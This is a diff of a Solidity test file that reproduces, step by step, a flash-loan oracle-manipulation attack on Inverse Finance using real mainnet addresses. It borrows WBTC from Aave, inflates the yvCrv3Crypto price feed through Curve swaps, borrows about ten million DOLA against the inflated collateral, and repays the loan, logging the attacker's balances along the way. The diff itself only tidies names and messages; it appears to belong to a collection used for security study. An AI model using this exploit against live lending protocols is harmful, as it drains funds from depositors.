@@ -3,86 +3,27 @@
 pragma solidity >=0.7.0 <0.9.0;
 
 import "ds-test/test.sol";
-
-interface IERC20 {
-    function totalSupply() external view returns (uint256);
-
-    function balanceOf(address account) external view returns (uint256);
-
-    function approve(address spender, uint256 amount) external returns (bool);
-
-    function transfer(address to, uint256 value) external returns (bool);
-    function transferFrom(
-        address from,
-        address to,
-        uint256 value
-    ) external returns (bool);
-}
-
-interface ILendingPool {
-
-  function flashLoan(
-    address receiverAddress,
-    address[] calldata assets,
-    uint256[] calldata amounts,
-    uint256[] calldata modes,
-    address onBehalfOf,
-    bytes calldata params,
-    uint16 referralCode
-  ) external;
-
-}
-interface IAToken{
-    function mintToTreasury(uint256 amount, uint256 index) external;
-    function balanceOf(address account) external view returns (uint256);
-     function approve (address spender, uint256 value) external ;
-}
-interface VyperContract {
-
-    function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;
-    function balanceOf(address account) external view returns (uint256);
-    function mint (address account, uint256 value) external ;
-    function approve (address spender, uint256 value) external ;
-    function transferUnderlyingTo(address target, uint256 amount) external returns (uint256);
-    function deposit (uint amounts, address recipient) external returns (uint256);
-    function exchange(address _pool, address _from, address _to, uint256 _amount, uint256 _expected, address _receiver ) external returns (uint256);
-    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 min_amount) external;
-
-}
-
-interface IUnitroller{
-function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
-
-}
-interface IAggregator {
-    function latestAnswer() external view returns (int256 answer);
-}
-interface CErc20Interface {
-
-   function mint(uint mintAmount) external returns (uint);
-   function balanceOf(address account) external view returns (uint256);
-   function borrow(uint borrowAmount) external returns (uint);
-}
+import "./interface.sol";
 
 contract ContractTest is DSTest {
 
-    IERC20 wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
-    VyperContract usdt = VyperContract(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
+    USDT usdt = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IERC20 DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
     IAToken awbtc = IAToken(0x9ff58f4fFB29fA2266Ab25e75e2A8b3503311656);
 
     ILendingPool  aaveLendingPool   = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
-    VyperContract Vyper_contract = VyperContract(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
+    VyperContract curveVyper_contract = VyperContract(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
     IERC20 crv3crypto =IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
     VyperContract yvCurve3Crypto= VyperContract(0xE537B5cc158EB71037D4125BDD7538421981E6AA);
-    VyperContract Vyper_contract2 = VyperContract(0x8e764bE4288B842791989DB5b8ec067279829809);
-    VyperContract Vyper_contract3 = VyperContract(0xAA5A67c256e27A5d80712c51971408db3370927D);
-    VyperContract Vyper_contract4 = VyperContract(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
-    CErc20Interface anYvCrv3Crypto  = CErc20Interface(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);
+    VyperContract curveRegistry = VyperContract(0x8e764bE4288B842791989DB5b8ec067279829809);
+    VyperContract dola3pool3crv = VyperContract(0xAA5A67c256e27A5d80712c51971408db3370927D);
+    VyperContract curve3pool  = VyperContract(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
+    CErc20Interface anYvCrv3CryptoInverse  = CErc20Interface(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);
     IUnitroller Unitroller = IUnitroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
     IAggregator YVCrv3CryptoFeed = IAggregator(0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C);
-    CErc20Interface InverseFinance = CErc20Interface(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);
-    VyperContract crv3 = VyperContract(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
+    CErc20Interface InverseFinanceDola = CErc20Interface(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);
+    IERC20 crv3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
     address[] assets = [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599];
     uint256[] amounts = [2700000000000];
     uint256[] modes = [0];
@@ -92,7 +33,7 @@ contract ContractTest is DSTest {
     function testExploit() public{
          
         aaveLendingPool.flashLoan(address(this),assets,amounts,modes,address(this),"0x",0);
-        emit log_named_uint("After exploit, WBTC balance of attacker:", wbtc.balanceOf(address(this))); 
+        emit log_named_uint("After flashloan repaid, profit in WBTC of attacker:", WBTC.balanceOf(address(this))); 
     }
 
   function executeOperation(
@@ -102,45 +43,47 @@ contract ContractTest is DSTest {
     address initiator,
     bytes memory params
   ) public  returns (bool) {
+    assets;
+    amounts;
+    premiums;
     params;
     initiator;
  
-
-    wbtc.approve(address(Vyper_contract),type(uint256).max);
-    wbtc.approve(address(Vyper_contract2),type(uint256).max);
-    usdt.approve(address(Vyper_contract2),type(uint256).max); 
-    DOLA.approve(address(Vyper_contract2),type(uint256).max); 
+    WBTC.approve(address(curveVyper_contract),type(uint256).max);
+    WBTC.approve(address(curveRegistry),type(uint256).max);
+    usdt.approve(address(curveRegistry),type(uint256).max); 
+    DOLA.approve(address(curveRegistry),type(uint256).max); 
     crv3crypto.approve(0xE537B5cc158EB71037D4125BDD7538421981E6AA,type(uint256).max);
 
-   emit log_named_uint("After flashswap, WBTC balance of attacker:", wbtc.balanceOf(address(this))/1e8);
+   emit log_named_uint("Flashloaned, WBTC balance of attacker:", WBTC.balanceOf(address(this))/1e8);
 
-   Vyper_contract.add_liquidity(amounts2,0); 
-   emit log_named_uint("After add liquidity, crv3crypto balance of attacker:", crv3crypto.balanceOf(address(this)));
-   emit log_named_uint("After add liquidity, WBTC balance of attacker:", wbtc.balanceOf(address(this))/1e8);
+   curveVyper_contract.add_liquidity(amounts2,0); 
+   emit log_named_uint("After add-liquidity, crv3crypto balance of attacker:", crv3crypto.balanceOf(address(this)));
+   emit log_named_uint("After add-liquidity, WBTC balance of attacker:", WBTC.balanceOf(address(this))/1e8);
    yvCurve3Crypto.deposit(5375596969399930881565,address(this));
-   emit log_named_uint("After yvCurve3Crypto deposit, yvCurve3 balance of attacker:", yvCurve3Crypto.balanceOf(address(this)));
+   emit log_named_uint("Deposited to Yearns Vault, yvCurve3 balance of attacker:", yvCurve3Crypto.balanceOf(address(this)));
   yvCurve3Crypto.approve(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587,100000000000000000000000000000000000000000000000000);
-  anYvCrv3Crypto.mint(4906754677503974414310);
-  emit log_named_uint("After anYvCrv3Crypto mint, anYvCrv3Crypto balance of attacker:", anYvCrv3Crypto.balanceOf(address(this)));
+  anYvCrv3CryptoInverse.mint(4906754677503974414310);
+  emit log_named_uint("Deposited to Inverse Yearn 3Crypto Vault, anYvCrv3Crypto balance of attacker:", anYvCrv3CryptoInverse.balanceOf(address(this)));
   address[] memory toEnter = new address[](1);
   toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587 ;
   Unitroller.enterMarkets(toEnter);
 
   emit log_named_int("YVCrv3CryptoFeed lastanswer:", YVCrv3CryptoFeed.latestAnswer());
-  Vyper_contract2.exchange(address(Vyper_contract),address(wbtc),address(usdt),2677500000000,0,address(this));
-  emit log_named_uint("After exchange, USDT balance of attacker:", usdt.balanceOf(address(this)));
+  curveRegistry.exchange(address(curveVyper_contract),address(WBTC),address(usdt),2677500000000,0,address(this));
+  emit log_named_uint("After swapped, USDT balance of attacker:", usdt.balanceOf(address(this)));
   emit log_named_int("Manipulated YVCrv3CryptoFeed lastanswer:", YVCrv3CryptoFeed.latestAnswer());
-  InverseFinance.borrow(10133949192393802606886848);
+  InverseFinanceDola.borrow(10133949192393802606886848);
   emit log_named_uint("DOLA balance of attacker:", DOLA.balanceOf(address(this)));
-  Vyper_contract2.exchange(address(Vyper_contract),address(usdt),address(wbtc),75403376186072,0,address(this));
-  emit log_named_uint("After exchange, WBTC balance of attacker:", wbtc.balanceOf(address(this))/1e8);
-  Vyper_contract2.exchange(address(Vyper_contract3),address(DOLA),address(crv3),10133949192393802606886848,0,address(this));
-  emit log_named_uint("After exchange,3crv balance of attacker:", crv3.balanceOf(address(this)));
-  Vyper_contract4.remove_liquidity_one_coin(9881355040729892287779421,2,0);
-  emit log_named_uint("After exchange, USDT balance of attacker:", usdt.balanceOf(address(this)));
-   Vyper_contract2.exchange(address(Vyper_contract),address(usdt),address(wbtc),10000000000000,0,address(this));
-   emit log_named_uint("After exchange, WBTC balance of attacker:", wbtc.balanceOf(address(this))); 
-  wbtc.approve(address(aaveLendingPool),2702430000000);
+  curveRegistry.exchange(address(curveVyper_contract),address(usdt),address(WBTC),75403376186072,0,address(this));
+  emit log_named_uint("After swapped, WBTC balance of attacker:", WBTC.balanceOf(address(this))/1e8);
+  curveRegistry.exchange(address(dola3pool3crv),address(DOLA),address(crv3),10133949192393802606886848,0,address(this));
+  emit log_named_uint("After swapped,3crv balance of attacker:", crv3.balanceOf(address(this)));
+  curve3pool.remove_liquidity_one_coin(9881355040729892287779421,2,0);
+  emit log_named_uint("After swapped, USDT balance of attacker:", usdt.balanceOf(address(this)));
+   curveRegistry.exchange(address(curveVyper_contract),address(usdt),address(WBTC),10000000000000,0,address(this));
+  emit log_named_uint("After swapped, WBTC balance of attacker:", WBTC.balanceOf(address(this))); 
+  WBTC.approve(address(aaveLendingPool),2702430000000);
   
   return true;
   }
